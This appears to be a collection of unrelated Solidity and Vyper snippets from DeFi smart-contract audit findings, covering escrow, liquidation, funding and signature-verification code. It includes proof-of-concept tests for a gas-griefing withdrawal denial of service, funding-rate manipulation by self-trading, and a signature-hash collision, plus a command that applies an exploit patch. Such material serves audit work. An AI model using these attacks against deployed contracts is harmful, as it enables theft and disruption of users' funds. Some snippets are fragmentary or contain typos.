"```\nbytes32 orderId = getOrderIdFromOrderRequest(orderRequest, salt);\nuint256 escrow = getOrderEscrow[orderId];\nif (amount > escrow) {\n    revert AmountTooLarge();\n}\n\n// Update escrow tracking\ngetOrderEscrow[orderId] = escrow - amount;\n// Notify escrow taken\nemit EscrowTaken(orderId, orderRequest.recipient, amount);\n\n// Take escrowed payment\nIERC20(orderRequest.paymentToken).safeTransfer(msg.sender, amount);\n```\n```\nfunction _cancelOrderAccounting(\n    OrderRequest calldata order,\n    bytes32 orderId,\n    OrderState memory orderState\n) \n    internal\n    virtual\n    override\n{\n    // Prohibit cancel if escrowed payment has been taken and not returned or filled\n    uint256 escrow = getOrderEscrow[orderId];\n    if (orderState.remainingOrder!= escrow) revert UnreturnedEscrow();\n\n    // Standard buy order accounting\n    super._cancelOrderAccounting(order, orderId, orderState);\n}\n```\n```\nfunction returnEscrow(OrderRequest calldata orderRequest, bytes32 salt, uint256 amount)\n    external\n    onlyRole(OPERATOR_ROLE)\n{\n    if (amount == 0) {\n        revert ZeroValue();\n    }\n\n    bytes32 orderId = getOrderIdFromOrderRequest(orderRequest, salt);\n    uint256 remainingOrder = getRemainingOrder(orderId);\n    uint256 escrow = getOrderEscrow[orderId];\n\n    if (escrow + amount > remainingOrder) {\n        revert AmountTooLarge();\n    }\n}\n```"
"```\nfunction _cancelOrderAccounting(\n    OrderRequest calldata orderRequest,\n    bytes32 orderId,\n    OrderState memory orderState\n) internal virtual override {\n    uint256 refund = orderState.remainingOrder + feeState.remainingPercentageFees;\n\n    if (refund + feeState.feesEarned == orderRequest.quantityIn) {\n        _closeOrder(orderId, orderRequest.paymentToken, 0);\n        // Refund full payment\n        refund = orderRequest.quantityIn;\n    } else {\n        // Otherwise close order and transfer fees\n        _closeOrder(orderId, orderRequest.paymentToken, feeState.feesEarned);\n    }\n\n    // Return escrow\n    IERC20(orderRequest.paymentToken).safeTransfer(orderRequest.recipient, refund);\n}\n```"
"```\ndebt_amount: uint256 = self._debt(_position_uid)\n\nmargin_debt_ratio: uint256 = position.margin_amount * PRECISION / debt_amount\n\namount_out_received: uint256 = self._swap(\n    position.position_token, position.debt_token, _reduce_by_amount, min_amount_out\n)\n\nreduce_margin_by_amount: uint256 = (amount_out_received * margin_debt_ratio / PRECISION)\nreduce_debt_by_amount: uint256 = amount_out_received - reduce_margin_by_amount\n\nposition.margin_amount -= reduce_margin_by_amount\n\nburnt_debt_shares: uint256 = self._repay(position.debt_token, reduce_debt_by_amount)\nposition.debt_shares -= burnt_debt_shares\nposition.position_amount -= _reduce_by_amount"
"```\ndef _calculate_leverage(\n    _position_value: uint256, \n    _debt_value: uint256, \n    _margin_value: uint256\n) -> uint256:\n    if _position_value <= _debt_value:\n        return max_value(uint256)\n\n    return (\n        PRECISION\n        * (_debt_value + _margin_value)\n        / (_position_value - _debt_value)\n        / PRECISION\n    )\n```"
```\ndef _debt_interest_since_last_update(_debt_token: address) -> uint256:\n    return (\n        (block.timestamp - self.last_debt_update[_debt_token]) *\n        self._current_interest_per_second(_debt_token) *\n        self.total_debt_amount[_debt_token] /\n        PERCENTAGE_BASE /\n        PRECISION\n    )\n```\n```\nexpected_interest_per_second = 9512937595129375\n\nassert (\n    expected_interest_per_second\n    == vault_configured.internal._current_interest_per_second(usdc.address)\n)\n```\n(block.timestamp - self.last_debt_update[_debt_token]) * \\n    self._current_interest_per_second(_debt_token) * \\n    self.total_debt_amount[_debt_token] / PERCENTAGE_BASE / PRECISION
"```\nfunction fillCloseRequest(\n    //...SNIP...\n    if (quote.positionType == PositionType.LONG) {\n        require(\n            closedPrice >= quote.requestedClosePrice,\n            ""PartyBFacet: Closed price isn't valid""\n        )\n```\n```\nfunction forceClosePosition(uint256 quoteId, PairUpnlAndPriceSig memory upnlSig) internal {\n    if (quote.positionType == PositionType.LONG) {\n        require(\n            upnlSig.price >=\n                quote.requestedClosePrice +\n                    (quote.requestedClosePrice * maLayout.forceCloseGapRatio) / 1e18,\n            ""PartyAFacet: Requested close price not reached""\n        );\n    }\n    LibQuote.closeQuote(quote, filledAmount, quote.requestedClosePrice);\n```"
"```\npragma solidity 0.8.9;\n\nimport ""./Utils.sol"";\n\ncontract MaliciousReceiver {\n    uint256 public gas;\n\n    receive() payable external {\n        gas = gasleft();\n        for (uint256 i = 0; i < 150000; i++) {}\n    }\n}\n\ncontract VUSDWithReceiveTest is Utils {\n    event WithdrawalFailed(address indexed trader, uint amount, bytes data);\n\n    function setUp() public {\n        setupContracts();\n    }\n\n    function test_CannotProcessWithdrawals(uint128 amount) public {\n        MaliciousReceiver r = new MaliciousReceiver();\n\n        vm.assume(amount >= 5e6);\n        mintVusd(address(this), amount);\n        mintVusd(alice, amount);\n        mintVusd(bob, amount);\n\n        husd.withdraw(amount);\n        vm.prank(alice);\n        husd.withdraw(amount);\n        vm.prank(bob);\n        husd.withdrawTo(address(r), amount);\n\n        assertEq(husd.withdrawalQLength(), 3);\n        assertEq(husd.start(), 0);\n\n        husd.processWithdrawals();\n\n        uint256 ethereumSoftGasLimit = 30_000_000;\n        assertGt(r.gas(), ethereumSoftGasLimit);\n\n    }\n\n    receive() payable external {\n        assertEq(msg.sender, address(husd));\n    }\n}\n```"
"```\n(bool success, bytes memory data) = withdrawal.usr.call{value: withdrawal.amount}("""");\nif (success) {\n    reserve -= withdrawal.amount;\n} else {\n    emit WithdrawalFailed(withdrawal.usr, withdrawal.amount, data);\n}\ni += 1;\n```"
"```\namount = balance() * shares / totalSupply()\n```\n```\nvusd.safeTransfer(marginAccount, toTransfer);\n```"
"```\nfunction _withdrawTo(address to, uint amount) internal {\n    require(amount >= 5 * (10 ** 6), ""min withdraw is 5 vusd"");\n    burn(amount);\n    withdrawals.push(Withdrawal(to, amount * 1e12));\n}\n```\n```\nuint public maxWithdrawalProcesses = 100;\n\nfunction withdrawalQueue() external view returns (Withdrawal[] memory queue) {\n    uint l = _min(withdrawals.length - start, maxWithdrawalProcesses);\n    queue = new Withdrawal[](l);\n\n    for (uint i = 0; i < l; i++) {\n        queue[i] = withdrawals[start + i];\n    }\n}\n```"
"```\nint256 premium = getMarkPriceTwap() - underlyingPrice;\n```\n```\nuint256 currentPeriodStart = (_blockTimestamp() / spotPriceTwapInterval) * spotPriceTwapInterval;\nuint256 lastPeriodStart = currentPeriodStart - spotPriceTwapInterval;\n\nif (markPriceTwapData.lastTimestamp <= lastPeriodStart) {\n    return markPriceTwapData.lastPrice;\n}\n\nif (markPriceTwapData.lastTimestamp >= currentPeriodStart) {\n    twap = markPriceTwapData.lastPeriodAccumulator / spotPriceTwapInterval;\n} else {\n    uint256 currentAccumulator = markPriceTwapData.accumulator + (currentPeriodStart - markPriceTwapData.lastTimestamp) * markPriceTwapData.lastPrice;\n    twap = currentAccumulator / spotPriceTwapInterval;\n}\n```\n```\ndiff --git a/hubble-protocol/test/foundry/OrderBook.t.sol b/hubble-protocol/test/foundry/OrderBook.t.sol\nindex b4dafdf..f5d36b2 100644\n--- a/hubble-protocol/test/foundry/OrderBook.t.sol\n@@ -228,6 +228,60 @@\ncontract OrderBookTests is Utils {\n    function testUserCanControlEmissions() public {\n        uint256 price = 1e6;\n        oracle.setUnderlyingPrice(address(wavax), int(uint(price)));\n\n        uint256 marginRequired = orderBook.getRequiredMargin(100 * MIN_SIZE, price) * 1e18 / uint(defaultWethPrice) * 1e10; // required weth margin in 1e18, add 1e10 for any precision loss\n\n        addMargin(alice, marginRequired, 1, address(weth));\n        addMargin(bob, marginRequired, 1, address(weth));\n\n        placeAndExecuteOrder(0, aliceKey, bobKey, MIN_SIZE * 90, price, true, false, MIN_SIZE * 90, false);\n\n        int256 availableMargin = marginAccount.getAvailableMargin(alice);\n        assertApproxEqRel(availableMargin, 200410, 0.1e18); // Assert within 10%\n\n        uint256 spreadLimit = amm.maxOracleSpreadRatio();\n        uint minPrice = price * (1e6 - spreadLimit) / 1e6;\n\n        for (uint i = 0; i < 100; i++) {\n            uint256 currentPeriodStart = (block.timestamp / 1 hours) * 1 hours;\n            vm.warp(currentPeriodStart + 3590);\n\n            placeAndExecuteOrder(0, aliceKey, aliceKey, MIN_SIZE, minPrice, true, false, MIN_SIZE, false);\n\n            vm.warp(currentPeriodStart + (3600 * 2) + 10);\n\n            orderBook.settleFunding();\n        }\n\n        availableMargin = marginAccount.getAvailableMargin(alice);\n        assertApproxEqRel(availableMargin, 716442910, 0.1e18); // Assert within 10%\n    }\n\n    function testLiquidateAndExecuteOrder(uint64 price, uint120 size_) public {\n        vm.assume(price > 10 && size_!= 0);\n        oracle.setUnderlyingPrice(address(wavax), int(uint(price)));"
"```\nwhile (i < withdrawals.length && (i - start) < maxWithdrawalProcesses) {\n    Withdrawal memory withdrawal = withdrawals[i];\n    if (reserve < withdrawal.amount) {\n        break;\n    }\n\n    (bool success, bytes memory data) = withdrawal/usr.call{value: withdrawal.amount}("""");\n    if (success) {\n        reserve -= withdrawal.amount;\n    }\n}"
"```\nfunction buyCollateralFromAuction(address token, uint amount) override external {\n    Auction memory auction = auctions[token];\n\n    require(_isAuctionOngoing(auction.startedAt, auction.expiryTime), ""IF.no_ongoing_auction"");\n\n    uint vusdToTransfer = _calcVusdAmountForAuction(auction, token, amount);\n    address buyer = _msgSender();\n\n    vusd.safeTransferFrom(buyer, address(this), vusdToTransfer);\n\n    IERC20(token).safeTransfer(buyer, amount); // will revert if there wasn't enough amount as requested\n\n    if (IERC20(token).balanceOf(address(this)) == 0) {\n        auctions[token].startedAt = 0;\n    }\n}\n```"
```\nfunction syncDeps(address _registry) public onlyGovernance {\n    IRegistry registry = IRegistry(_registry);\n\n    vusd = IVUSD(registry.vusd());\n    marginAccount = IMarginAccount(registry.marginAccount());\n    insuranceFund = IInsuranceFund(registry.insuranceFund());\n}\n```
"```\nfunction getLatestRoundData(AggregatorV3Interface _aggregator)\n    internal\n    view\n    returns (\n        uint80,\n        uint256,\n        uint256\n    ) {\n    (uint80 round, int256 latestPrice,, uint256 latestTimestamp, ) = _aggregator.latestRoundData();\n    finalPrice = uint256(latestPrice);\n    if (latestPrice <= 0) {\n        requireEnoughHistory(round);\n        (round, finalPrice, latestTimestamp) = getRoundData(_aggregator, round - 1);\n    }\n    return (round, finalPrice, latestTimestamp);\n}\n```"
"```\nfunction setSymbolsPrice(address partyA, PriceSig memory priceSig) internal {\n    MAStorage.Layout storage maLayout = MAStorage.layout();\n    AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n    LibMuon.verifyPrices(priceSig, partyA);\n    require(\n        priceSig.timestamp <= maLayout.liquidationTimestamp[partyA] + maLayout.liquidationTimeout,\n        ""LiquidationFacet: Expired signature""\n    );\n}\n```\nfunction verifyPrices(PriceSig memory priceSig, address partyA) internal view {\n    MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n    require(priceSig.prices.length == priceSig.symbolIds.length, ""LibMuon: Invalid length"");\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            muonLayout.muonAppId,\n            priceSig.reqId,\n            address(this),\n            partyA,\n            priceSig.upnl,\n            priceSig.totalUnrealizedLoss,\n            priceSig.symbolIds,\n            priceSig.prices,\n            priceSig.timestamp,\n            getChainId()\n        )\n    );\n    verifyTSSAndGateway(hash, priceSig.sigs, priceSig.gatewaySignature);\n}\n```"
"```\nfunction verifyPrices(PriceSig memory priceSig, address partyA) internal view {\n    MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n    require(priceSig.prices.length == priceSig.symbolIds.length, ""LibMuon: Invalid length"");\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            muonLayout.muonAppId,\n            priceSig.reqId,\n            address(this),\n            partyA,\n            priceSig.upnl,\n            priceSig.totalUnrealizedLoss,\n            priceSig.symbolIds,\n            priceSig.prices,\n            priceSig.timestamp,\n            getChainId()\n        )\n    );\n    verifyTSSAndGateway(hash, priceSig.sigs, priceSig.gatewaySignature);\n}\n```\n```\nfunction verifyPartyAUpnlAndPrice(\n    SingleUpnlAndPriceSig memory upnlSig,\n    address partyA,\n    uint256 symbolId\n) internal view {\n    MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            muonLayout.muonAppId,\n            upnlSig.reqId,\n            address(this),\n            partyA,\n            AccountStorage.layout().partyANonces[partyA],\n            upnlSig.upnl,\n            symbolId,\n            upnlSig.price,\n            upnlSig.timestamp,\n            getChainId()\n        )\n    );\n    verifyTSSAndGateway(hash, upnlSig.sigs, upnlSig.gatewaySignature);\n}\n```\n```\nfunction test() external {\n    address verifyPrices_partyA = address(0x1);\n    int256 verifyPrices_upnl = 100;\n    int256 verifyPrices_totalUnrealizedLoss = 100;\n    uint256[] memory verifyPrices_symbolIds = new uint256[](1);\n    verifyPrices_symbolIds[0] = 1;\n    uint256[] memory verifyPrices_prices = new uint256[](1);\n    verifyPrices_prices[0] = 1000;\n\n    bytes32 verifyPrices = keccak256(abi.encodePacked(\n        verifyPrices_partyA,\n        verifyPrices_upnl,\n        verifyPrices_totalUnrealizedLoss,\n        verifyPrices_symbolIds,\n        verifyPrices_prices\n    ));\n\n    address verifyPartyAUpnlAndPrice_partyA = verifyPrices_partyA;\n    int256 verifyPartyAUpnlAndPrice_partyANonces = verifyPrices_upnl;\n    int256 verifyPartyAUpnlAndPrice_upnl = verifyPrices_totalUnrealizedLoss;\n    uint256 verifyPartyAUpnlAndPrice_symbolId = verifyPrices_symbolIds[0];\n    uint256 verifyPartyAUpnlAndPrice_price = verifyPrices_prices[0];\n\n    bytes32 verifyPartyAUpnlAndPrice = keccak256(abi.encodePacked(\n        verifyPartyAUpnlAndPrice_partyA,\n        verifyPartyAUpnlAndPrice_partyANonces,\n        verifyPartyAUpnlAndPrice_upnl,\n        verifyPartyAUpnlAndPrice_symbolId,\n        verifyPartyAUpnlAndPrice_price\n    ));\n\n    console.log(""verifyPrices == verifyPartyAUpnlAndPrice:"", verifyPrices == verifyPartyAUpnlAndPrice);\n}\n```\n$ forge test -vvv\n\nRunning 1 test for test/Counter.t.sol:CounterTest\n[PASS] test() (gas: 4991)\nLogs:\n  verifyPrices == verifyPartyAUpnlAndPrice: true\n\nTest result: ok. 1 passed; 0 failed; finished in 11.27ms"
"```\nfunction depositForPartyB(uint256 amount) internal {\n    IERC20(GlobalAppStorage.layout().collateral).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amount\n    );\n\n    uint256 amountWith18Decimals = (amount * 1e18) / (10 ** IERC20Metadata(GlobalAppStorage.layout().collateral).decimals());\n    AccountStorage.layout().balances[msg.sender] += amountWith18Decimals;\n}\n```\n```\nfunction allocateForPartyB(uint256 amount, address partyA, bool increaseNonce) internal {\n    AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n    require(accountLayout.balances[msg.sender] >= amount, ""PartyBFacet: Insufficient balance"");\n    require(\n       !MAStorage.layout().partyBLiquidationStatus[msg.sender][partyA],\n        ""PartyBFacet: PartyB isn't solvent""\n    );\n    if (increaseNonce) {\n        accountLayout.partyBNonces[msg.sender][partyA] += 1;\n    }\n    accountLayout.balances[msg.sender] -= amount;\n    accountLayout.partyBAllocatedBalances[msg.sender][partyA] += amount;\n}\n```\n```\nfunction depositAndAllocateForPartyB(\n    uint256 amount,\n    address partyA\n) external whenNotPartyBActionsPaused onlyPartyB {\n    AccountFacetImpl.depositForPartyB(amount);\n    AccountFacetImpl.allocateForPartyB(amount, partyA, true);\n    emit DepositForPartyB(msg.sender, amount);\n    emit AllocateForPartyB(msg.sender, partyA, amount);\n}\n```"
"```\nfunction openPosition(\n    uint256 quoteId,\n    uint256 filledAmount,\n    uint256 openedPrice,\n    PairUpnlAndPriceSig memory upnlSig\n) internal returns (uint256 currentId) {\n    //...SNIP...\n\n    LibQuote.removeFromPendingQuotes(quote);\n\n    //...SNIP...\n\n    if (quote.partyA == quote.partyB) {\n        quoteLayout.quoteIdsOf[quote.partyA].push(currentId);\n    } else {\n        accountLayout.pendingLockedBalances[quote.partyA].sub(filledLockedValues);\n        accountLayout.partyBPendingLockedBalances[quote.partyB][quote.partyA].sub(filledLockedValues);\n    }\n}\n```"
"```\nfunction liquidatePartyA(address partyA, SingleUpnlSig memory upnlSig) internal {\n    MAStorage.Layout storage maLayout = MAStorage.layout();\n\n    LibMuon.verifyPartyAUpnl(upnlSig, partyA);\n    int256 availableBalance = LibAccount.partyAAvailableBalanceForLiquidation(\n        upnlSig.upnl,\n        partyA\n    );\n\n    require(availableBalance < 0, ""LiquidationFacet: PartyA is solvent"");\n\n    maLayout.liquidationStatus[partyA] = true;\n    maLayout.liquidationTimestamp[partyA] = upnlSig.timestamp;\n    AccountStorage.layout().liquidators[partyA].push(msg.sender);\n}\n```\n```\nfunction verifyPartyAUpnl(SingleUpnlSig memory upnlSig, address partyA) internal view {\n    MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            muonLayout.muonAppId,\n            upnlSig.reqId,\n            address(this),\n            partyA,\n            AccountStorage.layout().partyANonces[partyA],\n            upnlSig.upnl,\n            upnlSig.timestamp,\n            getChainId()\n        )\n    );\n    verifyTSSAndGateway(hash, upnlSig.sigs, upnlSig.gatewaySignature);\n}\n```\n```\nfunction liquidatePartyB(\n    //...SNIP...\n    LibMuon.verifyPartyBUpnl(upnlSig, partyB, partyA);\n```"
"```\nfunction liquidatePositionsPartyA(\n    address partyA,\n    uint256[] memory quoteIds\n) internal returns (bool) {\n    (bool hasMadeProfit, uint256 amount) = LibQuote.getValueOfQuoteForPartyA(\n        accountLayout.symbolsPrices[partyA][quote.symbolId].price,\n        LibQuote.quoteOpenAmount(quote),\n        quote\n    );\n\n    if (\n        accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.NORMAL\n    ) {\n        accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += quote.lockedValues.cva;\n        if (hasMadeProfit) {\n            accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n        } else {\n            accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += amount;\n        }\n    } else if (\n        accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.LATE\n    ) {\n        accountLayout.partyBAllocatedBalances[quote.partyB][partyA] +=\n            quote.lockedValues.cva -\n            ((quote.lockedValues.cva * accountLayout.liquidationDetails[partyA].deficit) /\n                accountLayout.lockedBalances[partyA].cva);\n        if (hasMadeProfit) {\n            accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n        } else {\n            accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += amount;\n        }\n    } else if (\n        accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.OVERDUE\n    ) {\n        if (hasMadeProfit) {\n            accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n        } else {\n            accountLayout.partyBAllocatedBalances[quote.partyB][partyA] +=\n                amount -\n                ((amount * accountLayout.liquidationDetails[partyA].deficit) /\n                    uint256(-accountLayout.liquidationDetails[partyA].totalUnrealizedLoss));\n        }\n    }\n}"
"```\nfunction liquidatePendingPositionsPartyA(address partyA) internal {\n    QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n    require(\n        MAStorage.layout().liquidationStatus[partyA],\n        ""LiquidationFacet: PartyA is solvent""\n    );\n\n    for (uint256 index = 0; index < quoteLayout.partyAPendingQuotes[partyA].length; index++) {\n        Quote storage quote = quoteLayout.quotes[\n            quoteLayout.partyAPendingQuotes[partyA][index]\n        ];\n\n        if (\n            (quote.quoteStatus == QuoteStatus.LOCKED ||\n                quote.quoteStatus == QuoteStatus.CANCEL_PENDING) &&\n            quoteLayout.partyBPendingQuotes[quote.partyB][partyA].length > 0\n        ) {\n            delete quoteLayout.partyBPendingQuotes[quote.partyB][partyA];\n            AccountStorage.layout().partyBPendingLockedBalances[quote.partyB][partyA].makeZero();\n        }\n\n        quote.quoteStatus = QuoteStatus.LIQUIDATED;\n        quote.modifyTimestamp = block.timestamp;\n    }\n\n    AccountStorage.layout().pendingLockedBalances[partyA].makeZero();\n    delete quoteLayout.partyAPendingQuotes[partyA];\n}\n```\n```\nfunction liquidatePartyB(\n    address partyB,\n    address partyA,\n    SingleUpnlSig memory upnlSig\n) internal {\n    uint256[] storage pendingQuotes = quoteLayout.partyAPendingQuotes[partyA];\n\n    for (uint256 index = 0; index < pendingQuotes.length; index++) {\n        Quote storage quote = quoteLayout.quotes[pendingQuotes[index]];\n        if (\n            quote.partyB == partyB &&\n            (quote.quoteStatus == QuoteStatus.LOCKED ||\n                quote.quoteStatus == QuoteStatus.CANCEL_PENDING)\n        ) {\n            accountLayout.pendingLockedBalances[partyA].subQuote(quote);\n\n            pendingQuotes[index] = pendingQuotes[pendingQuotes.length - 1];\n            pendingQuotes.pop();\n            quote.quoteStatus = QuoteStatus.LIQUIDATED;\n            quote.modifyTimestamp = block.timestamp;\n        }\n    }\n```"
```\nfunction getTradingFee(uint256 quoteId) internal view returns (uint256 fee) {\n    QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n    Quote storage quote = quoteLayout.quotes[quoteId];\n    Symbol storage symbol = SymbolStorage.layout().symbols[quote.symbolId];\n\n    if (quote.orderType == OrderType.LIMIT) {\n        fee = (LibQuote.quoteOpenAmount(quote) * quote.requestedOpenPrice * symbol.tradingFee) / 1e36;\n    } else {\n        fee = (LibQuote.quoteOpenAmount(quote) * quote.marketPrice * symbol.tradingFee) / 1e36;\n    }\n}\n```
"```\nfunction lockQuote(uint256 quoteId, SingleUpnlSig memory upnlSig, bool increaseNonce) internal {\n    QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n    AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n    Quote storage quote = quoteLayout.quotes[quoteId];\n    LibMuon.verifyPartyBUpnl(upnlSig, msg.sender, quote.partyA);\n    checkPartyBValidationToLockQuote(quoteId, upnlSig.upnl);\n    if (increaseNonce) {\n        accountLayout.partyBNonces[quote.partyB][quote.partyA] += 1;\n    }\n    quote.modifyTimestamp = block.timestamp;\n    quote.quoteStatus = QuoteStatus.LOCKED;\n    quote.partyB = msg.sender;\n    // lock funds for partyB\n    accountLayout.partyBPendingLockedBalances[msg.sender][quote.partyA].addQuote(quote);\n    quoteLayout.partyBPendingQuotes[msg.sender][quote.partyA].push(quote.id);\n}\n```"
"```\npartyAAvailableBalance = freeBalance + upnl + unlockedAmount\n```\n```\nrequire(\n    partyBAvailableBalance >= 0 &&\n    partyAAvailableBalance >= 0,\n    ""LibSolvency: Available balance is lower than zero""\n);\n```"
"```\nfunction forceClosePosition(uint256 quoteId, PairUpnlAndPriceSig memory upnlSig) internal {\n    AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n    MAStorage.Layout storage maLayout = MAStorage.layout();\n    Quote storage quote = QuoteStorage.layout().quotes[quoteId];\n\n    uint256 filledAmount = quote.quantityToClose;\n    require(quote.quoteStatus == QuoteStatus.CLOSE_PENDING, ""PartyAFacet: Invalid state"");\n    require(\n        block.timestamp > quote.modifyTimestamp + maLayout.forceCloseCooldown,\n        ""PartyAFacet: Cooldown not reached""\n    );\n}\n```\nfunction fillCloseRequest(\n    uint256 quoteId,\n    uint256 filledAmount,\n    uint256 closedPrice,\n    PairUpnlAndPriceSig memory upnlSig\n) internal {\n    if (quote.orderType == OrderType.LIMIT) {\n        require(quote.quantityToClose >= filledAmount, ""PartyBFacet: Invalid filledAmount"");\n    } else {\n        require(quote.quantityToClose == filledAmount, ""PartyBFacet: Invalid filledAmount"");\n    }\n    LibQuote.closeQuote(quote, filledAmount, closedPrice);\n}\n```\n```\nfunction closeQuote(Quote storage quote, uint256 filledAmount, uint256 closedPrice) internal {\n    QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n    AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n    quote.modifyTimestamp = block.timestamp;\n```"
"```\nfunction openPosition(\n    uint256 quoteId,\n    uint256 filledAmount,\n    uint256 openedPrice,\n    PairUpnlAndPriceSig memory upnlSig\n) internal returns (uint256 currentId) {\n    LibSolvency.isSolventAfterOpenPosition(quoteId, filledAmount, upnlSig);\n\n    accountLayout.partyANonces[quote.partyA] += 1;\n    accountLayout.partyBNonces[quote.partyB][quote.partyA] += 1;\n    quote.modifyTimestamp = block.timestamp;\n\n    LibQuote.removeFromPendingQuotes(quote);\n\n    if (quote.quantity == filledAmount) {\n        accountLayout.pendingLockedBalances[quote.partyA].subQuote(quote);\n        accountLayout.partyBPendingLockedBalances[quote.partyB][quote.partyA].subQuote(quote);\n\n        if (quote.orderType == OrderType.LIMIT) {\n            quote.lockedValues.mul(openedPrice).div(quote.requestedOpenPrice);\n        }\n        accountLayout.lockedBalances[quote.partyA].addQuote(quote);\n        accountLayout.partyBLockedBalances[quote.partyB][quote.partyA].addQuote(quote);\n    }\n```"
"```\nfunction withdraw(uint256 amount) external whenNotAccountingPaused notSuspended(msg.sender) {\n    AccountFacetImpl.withdraw(msg.sender, amount);\n    emit Withdraw(msg.sender, msg.sender, amount);\n}\n\nfunction withdrawTo(\n    address user,\n    uint256 amount\n) external whenNotAccountingPaused notSuspended(msg.sender) {\n    AccountFacetImpl.withdraw(user, amount);\n    emit Withdraw(msg.sender, user, amount);\n}\n```\n```\nmodifier notSuspended(address user) {\n    require(\n       !AccountStorage.layout().suspendedAddresses[user],\n        ""Accessibility: Sender is Suspended""\n    );\n    _\n}\n```"
"```\nfunction setSymbolsPrice(address partyA, PriceSig memory priceSig) internal {\n    if (accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.NONE) {\n        accountLayout.liquidationDetails[partyA] = LiquidationDetail({\n            liquidationType: LiquidationType.NONE,\n            upnl: priceSig.upnl,\n            totalUnrealizedLoss: priceSig.totalUnrealizedLoss,\n            deficit: 0,\n            liquidationFee: 0\n        });\n        AccountStorage.layout().liquidators[partyA].push(msg.sender);\n    } else {\n        require(\n            accountLayout.liquidationDetails[partyA].upnl == priceSig.upnl &&\n            accountLayout.liquidationDetails[partyA].totalUnrealizedLoss == priceSig.totalUnrealizedLoss,\n            ""LiquidationFacet: Invalid upnl sig""\n        );\n    }\n}"
```\nfunction liquidatePartyB(\n    //...SNIP...\n    if (uint256(-availableBalance) < accountLayout.partyBLockedBalances[partyB][partyA].lf) {\n        remainingLf = accountLayout.partyBLockedBalances[partyB][partyA].lf - uint256(-availableBalance);\n        liquidatorShare = (remainingLf * maLayout.liquidatorShare) / 1e18;\n\n        maLayout.partyBPositionLiquidatorsShare[partyB][partyA] = (remainingLf - liquidatorShare) / quoteLayout.partyBPositionsCount[partyB][partyA];\n    } else {\n        maLayout.partyBPositionLiquidatorsShare[partyB][partyA] = 0;\n    }\n```
"```\nfunction emergencyClosePosition(uint256 quoteId, PairUpnlAndPriceSig memory upnlSig) internal {\n    AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n    Quote storage quote = QuoteStorage.layout().quotes[quoteId];\n    require(quote.quoteStatus == QuoteStatus.OPENED, ""PartyBFacet: Invalid state"");\n    //...SNIP...\n```"
"```\nfunction closeQuote(Quote storage quote, uint256 filledAmount, uint256 closedPrice) internal {\n    if (quote.closedAmount == quote.quantity) {\n        quote.quoteStatus = QuoteStatus.CLOSED;\n        quote.requestedClosePrice = 0;\n        removeFromOpenPositions(quote.id);\n        quoteLayout.partyAPositionsCount[quote.partyA] -= 1;\n        quoteLayout.partyBPositionsCount[quote.partyB][quote.partyA] -= 1;\n    } else if (\n        quote.quoteStatus == QuoteStatus.CANCEL_CLOSE_PENDING || quote.quantityToClose == 0\n    ) {\n        quote.quoteStatus = QuoteStatus.OPENED;\n        quote.requestedClosePrice = 0;\n        quote.quantityToClose = 0; // for CANCEL_CLOSE_PENDING status\n    } else {\n        require(\n            quote.lockedValues.total() >=\n                SymbolStorage.layout().symbols[quote.symbolId].minAcceptableQuoteValue,\n            ""LibQuote: Remaining quote value is low""\n        );\n    }\n}"
"```\nfunction closeQuote(Quote storage quote, uint256 filledAmount, uint256 closedPrice) internal {\n    QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n    AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n    quote.modifyTimestamp = block.timestamp;\n\n    LockedValues memory lockedValues = LockedValues(\n        quote.lockedValues.cva -\n            ((quote.lockedValues.cva * filledAmount) / LibQuote.quoteOpenAmount(quote)),\n        quote.lockedValues.mm -\n            ((quote.lockedValues.mm * filledAmount) / LibQuote.quoteOpenAmount(quote)),\n        quote.lockedValues.lf -\n            ((quote.lockedValues.lf * filledAmount) / LibQuote.quoteOpenAmount(quote))\n    );\n    accountLayout.lockedBalances[quote.partyA].subQuote(quote).add(lockedValues);\n    accountLayout.partyBLockedBalances[quote.partyB][quote.partyA].subQuote(quote).add(lockedValues);\n    quote.lockedValues = lockedValues;\n\n    (bool hasMadeProfit, uint256 pnl) = LibQuote.getValueOfQuoteForPartyA(closedPrice, filledAmount, quote);\n    if (hasMadeProfit) {\n        accountLayout.allocatedBalances[quote.partyA] += pnl;\n        accountLayout.partyBAllocatedBalances[quote.partyB][quote.partyA] -= pnl;\n    } else {\n        accountLayout.allocatedBalances[quote.partyA] -= pnl;\n        accountLayout.partyBAllocatedBalances[quote.partyB][quote.partyA] += pnl;\n    }\n}"
```\ngit apply exploit-liquidation.patch\nnpx hardhat test\n```
